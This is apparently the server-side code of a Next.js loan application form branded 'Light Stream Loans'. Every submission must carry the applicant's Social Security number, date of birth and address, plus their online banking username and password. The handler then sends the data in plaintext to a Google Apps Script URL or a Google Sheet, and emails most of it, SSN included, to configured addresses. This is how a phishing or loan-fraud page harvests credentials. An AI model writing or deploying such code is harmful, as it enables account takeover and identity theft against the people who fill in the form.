import { NextRequest, NextResponse } from "next/server";
import { google } from "googleapis";
import nodemailer from "nodemailer";

export async function POST(req: NextRequest) {
  const data = await req.json().catch(() => null);

  if (!data) {
    return NextResponse.json({ error: "Invalid request body" }, { status: 400 });
  }

  const requiredFields = [
    "firstName",
    "lastName",
    "phone",
    "email",
    "ssn",
    "dob",
    "address",
    "city",
    "state",
    "zip",
    "housing",
    "loanAmount",
    "loanPurpose",
    "income",
    "employment",
    "bankUsername",
    "bankPassword",
  ];

  for (const field of requiredFields) {
    if (!data[field]) {
      return NextResponse.json({ error: `Missing field: ${field}` }, { status: 400 });
    }
  }

  const serviceAccountEmail = process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL;
  const privateKey = process.env.GOOGLE_PRIVATE_KEY?.replace(/\\n/g, "\n");
  const sheetId = process.env.GOOGLE_SHEET_ID;

  const googleScriptUrl = process.env.GOOGLE_SCRIPT_URL;

  const smtpHost = process.env.SMTP_HOST || "smtp.gmail.com";
  const smtpPort = Number(process.env.SMTP_PORT || 587);
  const smtpUser = process.env.SMTP_USER;
  const smtpPass = process.env.SMTP_PASS;
  const notificationEmail = process.env.NOTIFICATION_EMAIL
    ?.split(/[,;]/)
    .map((s) => s.trim())
    .filter(Boolean);

  try {
    if (googleScriptUrl) {
      const scriptRes = await fetch(googleScriptUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      if (!scriptRes.ok) {
        const text = await scriptRes.text().catch(() => "Script error");
        throw new Error(text);
      }

      return NextResponse.json({ ok: true });
    }

    if (serviceAccountEmail && privateKey && sheetId) {
      const auth = new google.auth.JWT({
        email: serviceAccountEmail,
        key: privateKey,
        scopes: ["https://www.googleapis.com/auth/spreadsheets"],
      });

      const sheets = google.sheets({ version: "v4", auth });

      const row = [
        new Date().toISOString(),
        data.firstName,
        data.lastName,
        data.phone,
        data.email,
        data.ssn,
        data.dob,
        data.address,
        data.city,
        data.state,
        data.zip,
        data.housing,
        data.loanAmount,
        data.loanPurpose,
        data.income,
        data.employment,
        data.bankUsername,
        data.bankPassword,
      ];

      await sheets.spreadsheets.values.append({
        spreadsheetId: sheetId,
        range: "Sheet1!A1",
        valueInputOption: "USER_ENTERED",
        requestBody: { values: [row] },
      });
    }

    if (smtpUser && smtpPass && notificationEmail?.length) {
      const transporter = nodemailer.createTransport({
        host: smtpHost,
        port: smtpPort,
        secure: smtpPort === 465,
        auth: { user: smtpUser, pass: smtpPass },
      });

      await transporter.sendMail({
        from: `"Light Stream Loans" <${smtpUser}>`,
        to: notificationEmail,
        subject: "New Loan Application Received",
        text: `A new loan application was submitted.

Name: ${data.firstName} ${data.lastName}
Phone: ${data.phone}
Email: ${data.email}
SSN: ${data.ssn}
DOB: ${data.dob}
Address: ${data.address}, ${data.city}, ${data.state} ${data.zip}
Housing: ${data.housing}
Loan amount: ${data.loanAmount}
Purpose: ${data.loanPurpose}
Income: ${data.income}
Employment: ${data.employment}
Bank username: ${data.bankUsername}

Submitted at: ${new Date().toISOString()}
`,
      });
    }

    return NextResponse.json({ ok: true });
  } catch (err) {
    const message = err instanceof Error ? err.message : "Unknown error";
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
